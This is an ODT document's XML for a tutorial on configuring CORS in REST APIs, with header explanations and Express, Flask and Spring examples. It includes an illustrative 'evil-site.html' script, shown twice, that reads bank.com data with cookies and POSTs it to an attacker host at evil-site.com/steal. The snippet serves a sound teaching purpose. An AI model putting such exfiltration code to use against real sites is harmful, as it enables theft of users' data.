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404cm" fo:margin-left="0cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table1.A" style:family="table-column">
      <style:table-column-properties style:column-width="7.608cm"/>
    </style:style>
    <style:style style:name="Table1.B" style:family="table-column">
      <style:table-column-properties style:column-width="5.489cm"/>
    </style:style>
    <style:style style:name="Table1.C" style:family="table-column">
      <style:table-column-properties style:column-width="5.30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207660"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="00207660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fo:color="#55308d" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="001dece0"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="2.501cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:line-height="100%" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:color="#2a6099" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00200d7f" officeooo:paragraph-rsid="00200d7f"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties officeooo:paragraph-rsid="002ea46b"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Heading_20_3" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="002ea46b"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L6"/>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L6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/>
      <style:text-properties officeooo:paragraph-rsid="002dae9a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8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="1.251cm" fo:margin-right="0cm" style:line-height-at-least="0.503cm" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:color="#d4d4d4" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:paragraph-rsid="002dae9a" fo:background-color="#1e1e1e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fo:margin-left="1.251cm" fo:margin-right="0cm" style:line-height-at-least="0.503cm" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:color="#6a9955" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:paragraph-rsid="002dae9a" fo:background-color="#1e1e1e"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" style:contextual-spacing="false"/>
      <style:text-properties fo:color="#6a9955" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" fo:background-color="#1e1e1e"/>
    </style:style>
    <style:style style:name="P22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  <style:text-properties fo:color="#6a9955" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:paragraph-rsid="002dae9a" fo:background-color="#1e1e1e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margin-left="1.251cm" fo:margin-right="0cm" style:line-height-at-least="0.503cm" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="002dae9a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officeooo:paragraph-rsid="002ea46b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>
      <style:text-properties officeooo:paragraph-rsid="002fe2f8"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="003154a2"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00316337"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="001dece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b5cea8" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="002a414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2a6099" loext:opacity="100%" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#55308d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/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#5b277d" loext:opacity="100%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ross-Origin Resource Sharing (CORS) </text:span></text:h>
      <text:h text:style-name="P2" text:outline-level="1"><text:span text:style-name="Strong_20_Emphasis">in REST APIs</text:span></text:h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h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis">1. Understanding CORS and Its Implications</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">What is CORS?</text:span></text:h>
      <text:list xml:id="list4268465145" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P25">A security mechanism that allows <text:span text:style-name="Strong_20_Emphasis">controlled cross-origin requests</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P25">Prevents malicious scripts from accessing resources on other domains</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P25">Governed by HTTP headers exchanged between browser and server</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9">HTTP/1.1 200 OK</text:p>
      <text:p text:style-name="P9">Access-Control-Allow-Origin: https://frontend.com</text:p>
      <text:p text:style-name="P9">Access-Control-Allow-Credentials: true</text:p>
      <text:p text:style-name="P9">Content-Type: application/json</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P10">Example:</text:p>
      <text:p text:style-name="P7">&lt;!-- evil-site.html --&gt;</text:p>
      <text:p text:style-name="P7">&lt;!DOCTYPE html&gt;</text:p>
      <text:p text:style-name="P7">&lt;html&gt;</text:p>
      <text:p text:style-name="P7">&lt;head&gt;&lt;title&gt;Malicious Page&lt;/title&gt;&lt;/head&gt;</text:p>
      <text:p text:style-name="P7">&lt;body&gt;</text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/>&lt;script&gt;</text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/>// Attempt to read protected data from bank.com</text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/>fetch("https://bank.com/api/account", {</text:p>
      <text:p text:style-name="P7"><text:s text:c="6"/>credentials: 'include' // tries to send cookies!</text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/>})</text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/>.then(res =&gt; res.text())</text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/>.then(data =&gt; {</text:p>
      <text:p text:style-name="P7"><text:s text:c="6"/>// Steal user data</text:p>
      <text:p text:style-name="P7"><text:s text:c="6"/>fetch("https://evil-site.com/steal", {</text:p>
      <text:p text:style-name="P7"><text:s text:c="8"/>method: "POST",</text:p>
      <text:p text:style-name="P7"><text:s text:c="8"/>body: JSON.stringify({ data })</text:p>
      <text:p text:style-name="P7"><text:s text:c="6"/>});</text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/>});</text:p>
      <text:p text:style-name="P7"><text:s text:c="2"/>&lt;/script&gt;</text:p>
      <text:p text:style-name="P7">&lt;/body&gt;</text:p>
      <text:p text:style-name="P7">&lt;/html&gt;</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="P11" text:outline-level="3"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis">When CORS Applies</text:span></text:h>
      <text:list xml:id="list1456713571" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P28">Affects requests made from browsers (not server-to-server calls)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">Triggered by:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P28">Different domains (<text:span text:style-name="Source_20_Text">api.example.com</text:span> ↔ <text:span text:style-name="Source_20_Text">app.example.com</text:span>)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P28">Different ports (<text:span text:style-name="Source_20_Text">localhost:3000</text:span> ↔ <text:span text:style-name="Source_20_Text">localhost:8080</text:span>)</text:p>
            </text:list-item>
            <text:list-item>
              <text:h text:style-name="P12" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T13">Different protocols (</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">http:</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T13"> ↔ </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">https:</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T13">)</text:span></text:span></text:h>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P11" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:h text:style-name="P11" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Same-Origin Policy vs CORS</text:span></text:h>
      <text:list xml:id="list586819771" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis">Same-Origin Policy (SOP)</text:span>: Blocks all cross-origin requests by default</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:tab/><text:tab/>frontend : <text:span text:style-name="T11">http://localhost:3000</text:span></text:p>
      <text:p text:style-name="Text_20_body"><text:tab/><text:tab/>backend API <text:s/>: <text:a xlink:type="simple" xlink:href="http://localhost:5000/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://localhost:5000</text:a></text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P6"><text:tab/><text:tab/>const cors = require('cors');</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/>app.use(cors());</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/>app.use(cors({ origin: 'http://localhost:3000' }));</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:list xml:id="list195213501397147" text:continue-numbering="true" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis">CORS</text:span>: Relaxes SOP when servers explicitly allow it</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P16">// <text:span text:style-name="T6">Example:</text:span></text:p>
      <text:p text:style-name="P22">// server.js or app.js</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T2">const</text:span> express = require(<text:span text:style-name="T3">'express'</text:span>);</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T2">const</text:span> cors = require(<text:span text:style-name="T3">'cors'</text:span>);</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T2">const</text:span> app = express();</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P18">app.use(cors()); <text:span text:style-name="T4">// allows all origins by default</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P18">app.get(<text:span text:style-name="T3">'/weather'</text:span>, <text:span text:style-name="T2">async</text:span> (req, res) <text:span text:style-name="T2">=&gt;</text:span> {</text:p>
      <text:p text:style-name="P20">// fetch from external API and send to frontend</text:p>
      <text:p text:style-name="P18">});</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P18">app.listen(<text:span text:style-name="T5">3000</text:span>, () <text:span text:style-name="T2">=&gt;</text:span> {</text:p>
      <text:p text:style-name="P18">console.log(<text:span text:style-name="T3">'Server running on http://localhost:3000'</text:span>);</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Strong_20_Emphasis">});</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Strong_20_Emphasis"/></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"/></text:h>
      <text:p text:style-name="Text_20_body">📜 <text:span text:style-name="Strong_20_Emphasis">Reference</text:span>: <text:a xlink:type="simple" xlink:href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">MDN CORS Documentation</text:a></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis">2. Configuring CORS in REST APIs</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Essential CORS Header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Access-Control-Allow-Origin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*</text:span></text:span><text:span text:style-name="T1"> or </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">https://yourdomain.com</text:span></text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P5">Specifies allowed origi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ccess-Control-Allow-Methods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GET, POST, PUT</text:span></text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P5">Allowed HTTP metho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ccess-Control-Allow-Headers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Content-Type, Authorization</text:span></text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P5">Allowed request head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ccess-Control-Allow-Credentials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true</text:span></text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P5">Allows cookies/credential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ccess-Control-Max-Age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86400</text:span></text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P5">Caches preflight results (seconds)</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔹 <text:span text:style-name="Source_20_Text">Access-Control-Allow-Origin</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">What it does:</text:span><text:line-break/><text:tab/>Specifies which domains are allowed to access your resources.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">With it (set to </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">*</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"> or specific origin):</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:tab/>Access-Control-Allow-Origin: *</text:span></text:p>
      <text:p text:style-name="Text_20_body">✅ Other origins (like frontend on a different domain) can access the API.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis">Without it:</text:span> </text:p>
      <text:p text:style-name="P32"><text:tab/>❌ Browser will <text:span text:style-name="Strong_20_Emphasis">block the response</text:span> for cross-origin requests </text:p>
      <text:p text:style-name="P32"><text:tab/>— you'll get a CORS error.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔹 <text:span text:style-name="Source_20_Text">Access-Control-Allow-Methods</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">What it does:</text:span><text:line-break/><text:tab/>Specifies allowed HTTP methods (e.g., GET, POST) for CORS requests.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">With it:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:tab/>Access-Control-Allow-Methods: GET, POST, PUT, DELETE</text:span></text:p>
      <text:p text:style-name="Text_20_body">✅ Only specified methods are allowed from the frontend.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis">Without it (during preflight request):</text:span> </text:p>
      <text:p text:style-name="P32"><text:tab/>❌ Browser <text:span text:style-name="Strong_20_Emphasis">blocks any non-GET/POST requests</text:span> like <text:span text:style-name="Source_20_Text">PUT</text:span>, <text:span text:style-name="Source_20_Text">DELETE</text:span>, etc. </text:p>
      <text:p text:style-name="P32"><text:tab/>— preflight fails.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>🔹 <text:span text:style-name="Source_20_Text">Access-Control-Allow-Headers</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">What it does:</text:span><text:line-break/><text:tab/>Lists allowed custom headers (like <text:span text:style-name="Source_20_Text">Content-Type</text:span>, <text:span text:style-name="Source_20_Text">Authorization</text:span>).</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">With it:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:tab/>Access-Control-Allow-Headers: Content-Type, Authorization</text:span></text:p>
      <text:p text:style-name="Text_20_body">✅ Your frontend can send custom headers.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis">Without it:</text:span> </text:p>
      <text:p text:style-name="P32"><text:tab/>❌ Requests with custom headers are <text:span text:style-name="Strong_20_Emphasis">blocked</text:span> </text:p>
      <text:p text:style-name="P32"><text:tab/>— especially <text:span text:style-name="Source_20_Text">Content-Type: application/json</text:span>.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔹 <text:span text:style-name="Source_20_Text">Access-Control-Allow-Credentials</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">What it does:</text:span><text:line-break/><text:tab/>Allows cookies or HTTP credentials to be sent with requests.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">With it:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:tab/>Access-Control-Allow-Credentials: true</text:span></text:p>
      <text:p text:style-name="Text_20_body">✅ Cookies or tokens can be sent in cross-origin requests.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P33"><text:span text:style-name="Strong_20_Emphasis">Without it:</text:span> </text:p>
      <text:p text:style-name="P33"><text:tab/>❌ Cookies/tokens (like session cookies) are <text:span text:style-name="Strong_20_Emphasis">not sent</text:span> even if the frontend tries.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔹 <text:span text:style-name="Source_20_Text">Access-Control-Max-Age</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">What it does:</text:span><text:line-break/><text:tab/>Specifies how long the browser can <text:span text:style-name="Strong_20_Emphasis">cache the preflight response</text:span> (in seconds).</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">With it:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:tab/>Access-Control-Max-Age: 86400</text:span></text:p>
      <text:p text:style-name="Text_20_body">✅ Reduces network calls — browser won’t send another OPTIONS request for 24 hours.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P34"><text:span text:style-name="Strong_20_Emphasis">Without it:</text:span> </text:p>
      <text:p text:style-name="P34"><text:tab/>❌ Browser sends <text:span text:style-name="Strong_20_Emphasis">OPTIONS request before every actual request</text:span>, causing latency.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>✅ Example: Full Proper CORS Response</text:h>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Origin: http://localhost:3000</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Methods: GET, POST</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Headers: Content-Type, Authorization</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Credentials: true</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">Access-Control-Max-Age: 3600</text:span></text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis"/></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Implementation Examples</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Node.js (Express)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">const cors = require('cors');</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">// Basic (allow all origins)</text:p>
      <text:p text:style-name="Preformatted_20_Text">app.use(cors());</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">// Customized</text:p>
      <text:p text:style-name="Preformatted_20_Text">app.use(cors({</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>origin: 'https://yourdomain.com',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>methods: ['GET', 'POST'],</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>allowedHeaders: ['Content-Type', 'Authorization']</text:p>
      <text:p text:style-name="P4">}));</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Python (Flask)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">from flask_cors import CORS</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Allow all routes</text:p>
      <text:p text:style-name="Preformatted_20_Text">CORS(app)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Per-route control</text:p>
      <text:p text:style-name="Preformatted_20_Text">@app.route('/api')</text:p>
      <text:p text:style-name="Preformatted_20_Text">@cross_origin(origins=['https://yourdomain.com'])</text:p>
      <text:p text:style-name="Preformatted_20_Text">def api_endpoint():</text:p>
      <text:p text:style-name="P4"><text:s text:c="4"/>return jsonify(data)</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Java (Spring Boot)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">@Configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">public class CorsConfig implements WebMvcConfigurer {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>@Override</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>public void addCorsMappings(CorsRegistry registry) {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>registry.addMapping("/api/**")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>.allowedOrigins("https://yourdomain.com")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>.allowedMethods("GET", "POST");</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="Horizontal_20_Line"><text:span text:style-name="Strong_20_Emphasis"/></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis">3. Best Practices for Handling CORS</text:span></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Security Recommendations</text:span></text:h>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="Strong_20_Emphasis">Be specific with allowed origins</text:span></text:p>
      <text:p text:style-name="P4">Access-Control-Allow-Origin: https://trusted-domain.com</text:p>
      <text:p text:style-name="Text_20_body">🚫 Avoid: <text:span text:style-name="Source_20_Text">Access-Control-Allow-Origin: *</text:span> (when using credentials)</text:p>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="Strong_20_Emphasis">Limit exposed methods/headers</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">Access-Control-Allow-Methods: GET, POST</text:p>
      <text:p text:style-name="P4">Access-Control-Allow-Headers: Content-Type</text:p>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="Strong_20_Emphasis">Use credentials carefully</text:span></text:p>
      <text:p text:style-name="P4">Access-Control-Allow-Credentials: true</text:p>
      <text:p text:style-name="Text_20_body">Requires:</text:p>
      <text:p text:style-name="P4">Access-Control-Allow-Origin: https://exact.origin.com <text:s/># No wildcard</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Performance Optimization</text:span></text:h>
      <text:p text:style-name="Text_20_body">⚡ <text:span text:style-name="Strong_20_Emphasis">Cache preflight responses</text:span></text:p>
      <text:p text:style-name="P4">Access-Control-Max-Age: 86400 <text:s/># 24 hours</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis">Troubleshooting Common Issues</text:span></text:h>
      <text:p text:style-name="Text_20_body">🔧 <text:span text:style-name="Strong_20_Emphasis">Problem</text:span>: Preflight fails with 403<text:line-break/><text:span text:style-name="Strong_20_Emphasis">Solution</text:span>: Ensure server handles <text:span text:style-name="Source_20_Text">OPTIONS</text:span> method</text:p>
      <text:p text:style-name="Text_20_body">🔧 <text:span text:style-name="Strong_20_Emphasis">Problem</text:span>: Missing CORS headers<text:line-break/><text:span text:style-name="Strong_20_Emphasis">Solution</text:span>: Verify middleware order (CORS should be early)</text:p>
      <text:p text:style-name="Text_20_body">🔧 <text:span text:style-name="Strong_20_Emphasis">Problem</text:span>: Credentials not working<text:line-break/><text:span text:style-name="Strong_20_Emphasis">Solution</text:span>: Check for:</text:p>
      <text:list xml:id="list1681663439" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P29">Matching exact origin (no wildcard <text:span text:style-name="Source_20_Text">*</text:span>)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29"><text:span text:style-name="Source_20_Text">withCredentials: true</text:span> on client</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Credentials: true</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">📜 <text:span text:style-name="Strong_20_Emphasis">Reference</text:span>: <text:a xlink:type="simple" xlink:href="https://web.dev/cross-origin-resource-sharing/" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">CORS Error Troubleshooting</text:a></text:p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Summary</text:span></text:h>
      <text:p text:style-name="Text_20_body">✔ <text:span text:style-name="Strong_20_Emphasis">CORS relaxes SOP</text:span> for controlled cross-origin access<text:line-break/>✔ <text:span text:style-name="Strong_20_Emphasis">Configure via response headers</text:span> (<text:span text:style-name="Source_20_Text">Access-Control-Allow-*</text:span>)<text:line-break/>✔ <text:span text:style-name="Strong_20_Emphasis">Use middleware</text:span> for consistent implementation<text:line-break/>✔ <text:span text:style-name="Strong_20_Emphasis">Follow security best practices</text:span> (avoid overly permissive rules)<text:line-break/>✔ <text:span text:style-name="Strong_20_Emphasis">Test thoroughly</text:span> across browsers</text:p>
      <text:p text:style-name="P8">Proper CORS configuration ensures your API is <text:span text:style-name="Strong_20_Emphasis">both secure and accessible</text:span>. 🌐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Horizontal_20_Line"><text:soft-page-break/></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🛡️ Context: Same-Origin Policy (SOP)</text:h>
      <text:p text:style-name="Text_20_body">The <text:span text:style-name="Strong_20_Emphasis">Same-Origin Policy</text:span> is a browser security feature that blocks JavaScript from reading or manipulating resources from another origin (domain, protocol, or port).</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔥 Malicious Attempt Example (Cross-Site Script)</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">👩‍💻 Attacker's Page (evil-site.com)</text:h>
      <text:p text:style-name="Text_20_body">This page <text:span text:style-name="Strong_20_Emphasis">tries to fetch data</text:span> from a user’s session on another site like <text:span text:style-name="Source_20_Text">bank.com</text:span>.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">&lt;!-- evil-site.html --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&lt;title&gt;Malicious Page&lt;/title&gt;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script&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>// Attempt to read protected data from bank.com</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>fetch("https://bank.com/api/account", {</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>credentials: 'include' // tries to send cookies!</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>})</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>.then(res =&gt; res.text())</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>.then(data =&gt; {</text:span></text:p>
